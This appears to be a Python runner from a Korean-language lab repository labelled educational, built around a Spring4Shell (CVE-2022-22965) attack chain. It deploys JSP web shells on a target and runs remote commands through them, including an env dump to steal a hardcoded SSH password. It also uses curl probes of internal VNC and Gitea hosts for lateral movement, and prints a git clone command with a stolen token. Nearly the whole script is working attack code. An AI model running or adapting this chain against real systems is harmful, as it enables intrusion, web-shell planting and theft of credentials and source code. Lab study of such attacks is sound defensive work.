"""
sub_run.py
Spring4Shell (CVE-2022-22965) - 서브 시나리오 (Misconfiguration & Credential Theft) 실행기
Educational Use Only

[실행 목적]
기존 run.py가 'CVE 취약점(소프트웨어 버그)' 체이닝에 집중했다면,
이 스크립트는 실제 현업에서 발생하는 '관리자 설정 오류(비밀번호 재사용 등)'를 
활용하여 어떻게 치명적인 수평적 이동(Lateral Movement)이 발생하는지 증명합니다.
"""

import urllib.request
import urllib.parse
import time
import sys
import os
import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts"))

try:
    from stage1_dropper import ExploitConfig, Spring4ShellPayloadGenerator, ExploitController
    from stage2_uploader import UploadConfig, LocalFileServerAdapter, Stage1CommandAdapter, Stage2UploadUseCase
except ImportError as e:
    print(f"\n[ERROR] {e}")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def header(title):
    print(f"\n{Colors.HEADER}{'=' * 60}{Colors.ENDC}")
    print(f"  {title}")
    print(f"{Colors.HEADER}{'=' * 60}{Colors.ENDC}")

def ok(msg):   print(f"  {Colors.OKGREEN}[OK]{Colors.ENDC}   {msg}")
def fail(msg): print(f"  {Colors.FAIL}[FAIL]{Colors.ENDC} {msg}")
def info(msg): print(f"  {Colors.OKBLUE}[*]{Colors.ENDC} {msg}")
def warn(msg): print(f"  {Colors.WARNING}[!]{Colors.ENDC} {msg}")
def step(n, title):
    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  STEP {n}. {title}")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")


# ==========================================
# 02.AttackScripts 공통 로직 재사용
# ==========================================
BASE_URL = "http://localhost:8011"
ATTACK_URL = f"{BASE_URL}/spring-form/login"
STAGER_URL = f"{BASE_URL}/yaho4.jsp"
STAGE2_URL = f"{BASE_URL}/health_check.jsp"

def check_shell(shell_url: str) -> str:
    try:
        req = urllib.request.Request(shell_url)
        res = urllib.request.urlopen(req, timeout=10)
        return res.read().decode("utf-8", errors="ignore").strip()
    except Exception as e:
        return f"[FAIL] Exception: {e}"

def execute_rce(cmd: str) -> str:
    encoded_cmd = urllib.parse.quote(cmd)
    url = f"{STAGE2_URL}?pwd=glory&cmd={encoded_cmd}"
    return check_shell(url)

def run_base_attack():
    results = {}
    header("Configuration & Base Attack (Spring4Shell)")
    print(f"  Target URL     : {ATTACK_URL}")
    print(f"  Stage2 Shell   : {STAGE2_URL}?pwd=glory&cmd=id")
    time.sleep(1)

    # 이미 쉘이 있는지 확인
    test_res = execute_rce("id")
    if "uid=0" in test_res or "uid=" in test_res:
        ok("Base web shell is already active. Skipping Step 1~4.")
        return True

    info("Web shell not found. Deploying via 02.AttackScripts...")
    
    # 1. Stage1
    config1 = ExploitConfig(target_url=ATTACK_URL, shell_filename="yaho4.jsp")
    generator = Spring4ShellPayloadGenerator()
    controller = ExploitController(generator)
    controller.run_exploit(config1)
    
    time.sleep(5)
    
    # 2. Stage2
    config2 = UploadConfig(stager_url=STAGER_URL, stage2_file="health_check.jsp", local_serve_port=9091)
    use_case = Stage2UploadUseCase(LocalFileServerAdapter(), Stage1CommandAdapter(), config2)
    use_case.run()
    
    time.sleep(2)
    test_res = execute_rce("id")
    if "uid=" in test_res:
        ok("Base web shell successfully deployed!")
        return True
    return False

# ==========================================
# Main Execution
# ==========================================
def main():
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}  Sub-Scenario Runner (Misconfigurations & Auth Theft){Colors.ENDC}")
    print(f"  Educational Use Only")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")

    if not run_base_attack():
        fail("Base attack failed. Cannot proceed with Sub-Scenarios.")
        sys.exit(1)

    # ══════════════════════════════════════════════════════════
    # 시나리오 A: SSH Credential Pivot
    # ══════════════════════════════════════════════════════════
    step("A", "SSH 자격 증명 재사용 (Direct Pivoting)")
    info("컨테이너 내부에 하드코딩된 SSH 비밀번호 환경변수를 탈취하여 인접 서버로 직접 이동합니다.")
    
    env_dump = execute_rce("env")
    ssh_password = ""
    for line in env_dump.split("\n"):
        if "SSH_PASSWORD" in line:
            ssh_password = line.split("=", 1)[1].strip()
            
    if ssh_password:
        ok(f"치명적 설정 오류 발견! 하드코딩된 비밀번호 탈취 성공: [ {ssh_password} ]")
        info(f"획득한 비밀번호 '{ssh_password}' 하나만으로 내부망의 Struts 서버 등 모든 인접 컨테이너의 SSH 제어권 획득이 가능해졌습니다.")
        info("(TeamCity 등 복잡한 취약점 공격을 전혀 수행할 필요가 없습니다!)")
    else:
        warn("SSH 비밀번호를 찾지 못했습니다.")

    # ══════════════════════════════════════════════════════════
    # 시나리오 B: Employee Desktop(VNC) 하이재킹
    # ══════════════════════════════════════════════════════════
    step("B", "Employee Desktop(VNC) 하이재킹 및 설계도 탈취")
    info("사내망에 구동 중인 직원의 원격 데스크톱 컨테이너를 탐색하고, 터널링 타겟을 확보합니다.")
    
    vnc_check = execute_rce("curl -s -m 3 http://employee-desktop:6901 -I")
    if "HTTP/1" in vnc_check:
        ok("내부망에서 VNC 데스크톱 서버(employee-desktop:6901)의 존재를 확인했습니다!")
        info("공격자는 터널링 도구(Chisel)를 통해 해당 6901 포트를 자신의 PC로 포워딩합니다.")
        info("이후 기본 비밀번호 'password'를 입력하여 접속한 뒤, 직원의 마우스를 움직여 직원의 권한으로 매핑된 사내 NAS 도면을 유유히 복사합니다.")
    else:
        warn("employee-desktop 컨테이너를 찾을 수 없습니다.")

    # ══════════════════════════════════════════════════════════
    # 시나리오 C: Gitea 사내 소스코드 탈취
    # ══════════════════════════════════════════════════════════
    step("C", "Gitea 사내 소스코드 저장소 HTTP 직접 강탈")
    info("내부망 Gitea 서버를 향해 HTTP 요청을 보내, 취약한 패스워드나 탈취된 토큰을 활용한 소스코드 덤프를 수행합니다.")
    
    gitea_check = execute_rce("curl -s -m 5 http://gitea:3000/api/v1/version")
    if "version" in gitea_check.lower():
        ok(f"사내 소스코드 저장소(Gitea) 통신 성공! 응답: {gitea_check}")
        info("공격자는 Spring 서버에 남겨진 개발자의 git-credentials 쿠키나 로그 찌꺼기를 재사용해")
        info("아래 명령어로 전체 소스코드를 조용히 다운로드합니다.")
        print(f"  {Colors.WARNING}▶ git clone http://[탈취한토큰]@gitea:3000/company/project.git{Colors.ENDC}")
    else:
        warn("Gitea 컨테이너를 찾을 수 없습니다.")

    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}[COMPLETED]{Colors.ENDC} 모든 서브 시나리오 점검 완료!")
    print("  기존 체이닝 스크립트와 달리, 이 공격들은 소프트웨어 패치만으로 막을 수 없는 '인프라 설정 오류' 위주입니다.")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
